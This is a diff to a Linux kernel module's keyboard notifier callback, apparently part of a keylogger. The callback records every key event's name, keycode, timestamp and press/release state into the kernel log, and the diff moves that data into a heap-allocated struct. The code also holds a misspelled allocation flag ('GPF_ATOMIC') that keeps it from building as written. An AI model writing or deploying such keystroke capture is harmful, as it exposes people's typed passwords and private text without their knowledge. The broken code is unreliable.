@@ -35,21 +35,19 @@ static struct miscdevice device = {
 static int	keyboard_event(struct notifier_block *nb, unsigned long action, void *data)
 {
 	struct keyboard_notifier_param	*param = data;
-	struct s_key			key = keys_table[param->value];
 	struct timespec64		ts;
-	struct tm			tm;
+	struct s_keystroke		*stroke;
 
-	if (action != KBD_KEYCODE)
-		return NOTIFY_OK;
+	stroke = kmalloc(sizeof(struct s_keystroke), GPF_ATOMIC);
+	if (!stroke || action != KBD_KEYCODE)
+		return kfree(stroke), NOTIFY_OK;
+	memcpy(&(stroke->key), &(keys_table[param->value]), sizeof(struct s_key));
 	ktime_get_real_ts64(&ts);
-	time64_to_tm(ts.tv_sec, 0, &tm);
-	pr_info("%02d:%02d:%02d %s (%llu) %s\n", 
-			tm.tm_hour,
-			tm.tm_min,
-			tm.tm_sec,
-			key.name, 
-			key.keycode, 
-			param->down ? "pressed" : "released");
+	time64_to_tm(ts.tv_sec, 0, &(stroke->tm));
+
+	pr_info("%02d:%02d:%02d %s (%llu) %s\n", stroke->tm.tm_hour, stroke->tm.tm_min, stroke->tm.tm_sec,
+			stroke->key.name, stroke->key.keycode, param->down ? "pressed" : "released");
+	kfree(stroke); ///// to remove later for fuck's sake
 	return NOTIFY_OK;
 }
 
